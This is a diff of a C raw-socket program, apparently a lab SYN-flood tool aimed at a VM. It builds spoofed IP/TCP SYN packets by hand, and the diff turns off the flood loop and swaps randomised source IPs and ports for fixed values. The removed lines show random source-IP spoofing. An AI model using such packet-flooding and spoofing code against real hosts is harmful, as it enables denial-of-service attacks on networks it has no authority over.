@@ -4,9 +4,7 @@
  *  Created on: May 4, 2016
  *      Author: jiaziyi
  */
-// ref https://www.opensourceforu.com/2015/03/a-guide-to-using-raw-sockets/
-// ref https://www.binarytides.com/raw-sockets-c-code-linux/
-// ref for TCP rawIP espacially checksum https://www.binarytides.com/raw-sockets-c-code-linux/ f
+
 #include<stdio.h>
 #include<string.h>
 #include<sys/socket.h>
@@ -34,6 +32,7 @@ struct pseudo_header
 
 int main(int argc, char *argv[])
 {
+	
 	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     int hincl =1 ;                  /* 1 = on, 0 = off */
     setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
@@ -41,7 +40,7 @@ int main(int argc, char *argv[])
 		perror("Error creating raw socket ");
 		exit(1);
 	}
-	int flood=1;
+	int flood=0;
 	do{
 
 		char packet[65536];
@@ -77,17 +76,17 @@ void fil_up_syn_flood_rawheader(char *packet){
 
 void random_IP_header(struct iphdr *iph){
 	
-	char  random_source_ip[16] ;
-	int r1= rand()%256;
-	int r2= rand()%256;
-	int r3= rand()%256;
-	int r4= rand()%256;
-	printf("%d, %d,%d,%d\n",r1,r2,r3,r4);
+	// char  random_source_ip[16] ;
+	// int r1= rand()%256;
+	// int r2= rand()%256;
+	// int r3= rand()%256;
+	// int r4= rand()%256;
+	// printf("%d, %d,%d,%d\n",r1,r2,r3,r4);
 	
-	sprintf(random_source_ip,"%d.%d.%d.%d",r1,r2,r3,r4);
-	printf("this is the source_ip: %s\n",random_source_ip);
+	// sprintf(random_source_ip,"%d.%d.%d.%d",r1,r2,r3,r4);
+	// printf("this is the source_ip: %s\n",random_source_ip);
 	iph->version=4;
-	iph->ihl=5;
+	iph->ihl=5;// there 5*4 byte
 	iph->tos= 0; 
 	iph->tot_len=sizeof(struct iphdr)+sizeof(struct tcphdr)+strlen(TEST_STRING);    
 
@@ -96,7 +95,7 @@ void random_IP_header(struct iphdr *iph){
 	iph->ttl=255;
 	iph->protocol=IPPROTO_TCP; // tcp service https://www.iana.org/assignments/protocol-numbers/protocol-numbers.xhtml
 	iph->check=0;
-	iph->saddr=inet_addr(random_source_ip);//find source random_ip;	
+	iph->saddr=inet_addr("192.168.56.1");//find source random_ip;	
 	iph->daddr=inet_addr(VM_IP);
 	iph->check=checksum((unsigned short *)iph, sizeof(struct iphdr));
 
@@ -108,9 +107,10 @@ void random_TCP_header(struct tcphdr *tcph,unsigned int source_address,unsigned 
 	
 	//fill the TCP header
 
-	int random_source_port = rand()%PORT_MAX;
-	printf("The source_port:%d\n",random_source_port);
-	tcph ->source = htons(random_source_port);//ramdom port
+	// int random_source_port = rand()%PORT_MAX;
+	// printf("The source_port:%d\n",random_source_port);
+	// tcph ->source = htons(random_source_port);//ramdom port
+	tcph ->source = htons(49776);
 	tcph ->dest = htons(VM_PORT);
 	tcph->seq = 0;
 	tcph->ack_seq = 0;
